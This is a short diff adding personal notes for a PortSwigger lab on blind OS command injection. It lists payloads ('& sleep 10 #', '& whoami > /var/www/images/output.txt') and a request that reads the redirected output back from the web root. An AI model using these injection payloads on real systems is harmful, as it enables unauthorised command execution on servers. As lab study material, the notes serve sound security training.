@@ -1,0 +1,14 @@
+Link: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+
+Step 
+1: Confirm blind command injection
+    -> & sleep 10 #
+
+2: check where images are store
+    /var/www/images
+
+3: Redirect output to file
+    -> & whoami > /var/www/images/output.txt
+
+4: CHeck if file was created
+    /image?filename=output.txt
